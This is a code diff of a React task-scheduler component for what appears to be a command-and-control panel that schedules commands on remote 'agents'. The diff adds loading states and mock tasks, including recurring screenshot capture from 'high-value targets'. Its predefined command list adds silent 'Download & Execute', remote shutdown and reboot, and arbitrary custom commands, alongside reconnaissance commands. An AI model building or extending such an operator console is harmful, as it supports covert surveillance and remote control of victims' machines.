@@ -1,5 +1,6 @@
-import React, { useState } from 'react';
-import { Agent } from '../services/agentService';
+import React, { useState, useEffect } from 'react';
+import { Agent } from '../types';
+import toast from 'react-hot-toast';
 
 interface TaskSchedulerProps {
   agents: Agent[];
@@ -34,32 +35,9 @@ interface TaskResult {
 }
 
 const TaskScheduler: React.FC<TaskSchedulerProps> = ({ agents, onScheduleTask = () => {} }) => {
-  const [tasks, setTasks] = useState<ScheduledTask[]>([
-    {
-      id: '1',
-      name: 'System Information Gathering',
-      description: 'Collect system information from all online agents',
-      command: 'systeminfo',
-      targetAgents: ['all'],
-      schedule: { type: 'recurring', interval: 'daily', intervalValue: 1 },
-      status: 'active',
-      createdAt: new Date(Date.now() - 86400000),
-      lastRun: new Date(Date.now() - 3600000),
-      nextRun: new Date(Date.now() + 82800000),
-    },
-    {
-      id: '2',
-      name: 'Screenshot Capture',
-      description: 'Take screenshots from selected high-value targets',
-      command: 'screenshot',
-      targetAgents: ['agent-1', 'agent-3'],
-      schedule: { type: 'recurring', interval: 'hourly', intervalValue: 2 },
-      status: 'active',
-      createdAt: new Date(Date.now() - 172800000),
-      lastRun: new Date(Date.now() - 7200000),
-      nextRun: new Date(Date.now() + 300000),
-    }
-  ]);
+  const [tasks, setTasks] = useState<ScheduledTask[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
 
   const [showCreateModal, setShowCreateModal] = useState(false);
   const [selectedTask, setSelectedTask] = useState<ScheduledTask | null>(null);
@@ -74,46 +52,150 @@ const TaskScheduler: React.FC<TaskSchedulerProps> = ({ agents, onScheduleTask = 
     intervalValue: 1
   });
 
-  const onlineAgents = agents.filter(agent => agent.status === 'Online');
+  const onlineAgents = agents.filter(agent => agent.status === 'online');
+
+  // Fetch tasks from backend
+  const fetchTasks = async () => {
+    try {
+      setLoading(true);
+      setError(null);
+      
+      // For now, we'll use mock data since the backend doesn't have scheduled tasks yet
+      // In a real implementation, this would call the backend API
+      const mockTasks: ScheduledTask[] = [
+        {
+          id: '1',
+          name: 'System Information Gathering',
+          description: 'Collect system information from all online agents',
+          command: 'systeminfo',
+          targetAgents: ['all'],
+          schedule: { type: 'recurring', interval: 'daily', intervalValue: 1 },
+          status: 'active',
+          createdAt: new Date(Date.now() - 86400000),
+          lastRun: new Date(Date.now() - 3600000),
+          nextRun: new Date(Date.now() + 82800000),
+        },
+        {
+          id: '2',
+          name: 'Screenshot Capture',
+          description: 'Take screenshots from selected high-value targets',
+          command: 'screenshot',
+          targetAgents: ['agent-1', 'agent-3'],
+          schedule: { type: 'recurring', interval: 'hourly', intervalValue: 2 },
+          status: 'active',
+          createdAt: new Date(Date.now() - 172800000),
+          lastRun: new Date(Date.now() - 7200000),
+          nextRun: new Date(Date.now() + 300000),
+        }
+      ];
+      
+      setTasks(mockTasks);
+    } catch (error) {
+      console.error('Failed to fetch tasks:', error);
+      setError('Failed to fetch tasks');
+      toast.error('Failed to fetch tasks');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // Create a new scheduled task
+  const createScheduledTask = async (taskData: Omit<ScheduledTask, 'id' | 'createdAt'>) => {
+    try {
+      // For now, we'll add it to local state
+      // In a real implementation, this would call the backend API
+      const newTask: ScheduledTask = {
+        ...taskData,
+        id: Date.now().toString(),
+        createdAt: new Date()
+      };
+      
+      setTasks(prev => [...prev, newTask]);
+      toast.success('Task created successfully');
+      
+      // Call the callback if provided
+      onScheduleTask(newTask);
+      
+      return newTask;
+    } catch (error) {
+      console.error('Failed to create task:', error);
+      toast.error('Failed to create task');
+      throw error;
+    }
+  };
+
+  // Update task status
+  const updateTaskStatus = async (taskId: string, status: ScheduledTask['status']) => {
+    try {
+      setTasks(prev => prev.map(task => 
+        task.id === taskId ? { ...task, status } : task
+      ));
+      toast.success(`Task ${status === 'active' ? 'activated' : 'paused'}`);
+    } catch (error) {
+      console.error('Failed to update task status:', error);
+      toast.error('Failed to update task status');
+    }
+  };
+
+  // Delete task
+  const deleteScheduledTask = async (taskId: string) => {
+    try {
+      setTasks(prev => prev.filter(task => task.id !== taskId));
+      toast.success('Task deleted successfully');
+    } catch (error) {
+      console.error('Failed to delete task:', error);
+      toast.error('Failed to delete task');
+    }
+  };
+
+  // Load tasks on component mount
+  useEffect(() => {
+    fetchTasks();
+  }, []);
 
   const predefinedCommands = [
-    { label: 'System Information', value: 'systeminfo', description: 'Gather detailed system information' },
+    { label: 'System Info', value: 'systeminfo', description: 'Get detailed system information' },
     { label: 'Screenshot', value: 'screenshot', description: 'Capture desktop screenshot' },
-    { label: 'Network Scan', value: 'netstat -an', description: 'List network connections' },
     { label: 'Process List', value: 'tasklist', description: 'List running processes' },
-    { label: 'User Accounts', value: 'net user', description: 'List user accounts' },
-    { label: 'Installed Software', value: 'wmic product get name,version', description: 'List installed programs' },
-    { label: 'Registry Dump', value: 'reg export HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall', description: 'Export registry keys' },
-    { label: 'File Search', value: 'dir /s *.txt', description: 'Search for specific files' }
+    { label: 'Network Status', value: 'netstat -an', description: 'List network connections' },
+    { label: 'Current User', value: 'whoami', description: 'Show current user' },
+    { label: 'IP Config', value: 'ipconfig', description: 'Show network configuration' },
+    { label: 'File Explorer', value: 'dir', description: 'List directory contents' },
+    { label: 'Reboot', value: 'shutdown /r /t 0', description: 'Restart the system' },
+    { label: 'Shutdown', value: 'shutdown /s /t 0', description: 'Shutdown the system' },
+    { label: 'Download File', value: 'download', description: 'Download file from URL', isModal: true },
+    { label: 'Download & Execute', value: 'download_execute', description: 'Download and execute silently', isModal: true },
+    { label: 'Custom Command', value: 'custom', description: 'Execute custom command', isModal: true }
   ];
 
-  const handleCreateTask = () => {
+  const handleCreateTask = async () => {
     if (!newTask.name || !newTask.command) return;
 
-    const task: ScheduledTask = {
-      id: Date.now().toString(),
-      name: newTask.name,
-      description: newTask.description,
-      command: newTask.command,
-      targetAgents: newTask.targetAgents.length > 0 ? newTask.targetAgents : ['all'],
-      schedule: {
-        type: newTask.scheduleType,
-        ...(newTask.scheduleType === 'once' 
-          ? { datetime: new Date(newTask.datetime) }
-          : { interval: newTask.interval, intervalValue: newTask.intervalValue }
-        )
-      },
-      status: 'pending',
-      createdAt: new Date(),
-      nextRun: newTask.scheduleType === 'once' 
-        ? new Date(newTask.datetime)
-        : new Date(Date.now() + getIntervalMs(newTask.interval, newTask.intervalValue))
-    };
+    try {
+      const taskData: Omit<ScheduledTask, 'id' | 'createdAt'> = {
+        name: newTask.name,
+        description: newTask.description,
+        command: newTask.command,
+        targetAgents: newTask.targetAgents.length > 0 ? newTask.targetAgents : ['all'],
+        schedule: {
+          type: newTask.scheduleType,
+          ...(newTask.scheduleType === 'once' 
+            ? { datetime: new Date(newTask.datetime) }
+            : { interval: newTask.interval, intervalValue: newTask.intervalValue }
+          )
+        },
+        status: 'pending',
+        nextRun: newTask.scheduleType === 'once' 
+          ? new Date(newTask.datetime)
+          : new Date(Date.now() + getIntervalMs(newTask.interval, newTask.intervalValue))
+      };
 
-    setTasks(prev => [...prev, task]);
-    onScheduleTask(task);
-    setShowCreateModal(false);
-    resetNewTask();
+      await createScheduledTask(taskData);
+      setShowCreateModal(false);
+      resetNewTask();
+    } catch (error) {
+      console.error('Failed to create task:', error);
+    }
   };
 
   const resetNewTask = () => {
@@ -139,16 +221,16 @@ const TaskScheduler: React.FC<TaskSchedulerProps> = ({ agents, onScheduleTask = 
     return multipliers[interval as keyof typeof multipliers] * value;
   };
 
-  const toggleTaskStatus = (taskId: string) => {
-    setTasks(prev => prev.map(task => 
-      task.id === taskId 
-        ? { ...task, status: task.status === 'active' ? 'paused' : 'active' }
-        : task
-    ));
+  const toggleTaskStatus = async (taskId: string) => {
+    const task = tasks.find(t => t.id === taskId);
+    if (!task) return;
+    
+    const newStatus = task.status === 'active' ? 'paused' : 'active';
+    await updateTaskStatus(taskId, newStatus);
   };
 
-  const deleteTask = (taskId: string) => {
-    setTasks(prev => prev.filter(task => task.id !== taskId));
+  const deleteTask = async (taskId: string) => {
+    await deleteScheduledTask(taskId);
   };
 
   const getStatusColor = (status: string) => {
@@ -215,8 +297,34 @@ const TaskScheduler: React.FC<TaskSchedulerProps> = ({ agents, onScheduleTask = 
           <h3 className="text-red-400 font-bold text-lg">📋 SCHEDULED TASKS</h3>
         </div>
         
-        <div className="divide-y divide-red-500/10">
-          {tasks.map((task) => (
+        {loading ? (
+          <div className="p-8 text-center">
+            <div className="text-gray-400">Loading tasks...</div>
+          </div>
+        ) : error ? (
+          <div className="p-8 text-center">
+            <div className="text-red-400 mb-4">{error}</div>
+            <button
+              onClick={fetchTasks}
+              className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded transition-colors"
+            >
+              Retry
+            </button>
+          </div>
+        ) : (
+          <div className="divide-y divide-red-500/10">
+            {tasks.length === 0 ? (
+              <div className="p-8 text-center">
+                <div className="text-gray-400 mb-4">No scheduled tasks found</div>
+                <button
+                  onClick={() => setShowCreateModal(true)}
+                  className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded transition-colors"
+                >
+                  Create First Task
+                </button>
+              </div>
+            ) : (
+              tasks.map((task) => (
             <div key={task.id} className="p-6 hover:bg-red-900/10 transition-colors">
               <div className="flex items-start justify-between">
                 <div className="flex-1">
@@ -302,8 +410,10 @@ const TaskScheduler: React.FC<TaskSchedulerProps> = ({ agents, onScheduleTask = 
                 </div>
               </div>
             </div>
-          ))}
-        </div>
+              ))
+            )}
+          </div>
+        )}
       </div>
 
       {/* Create Task Modal */}
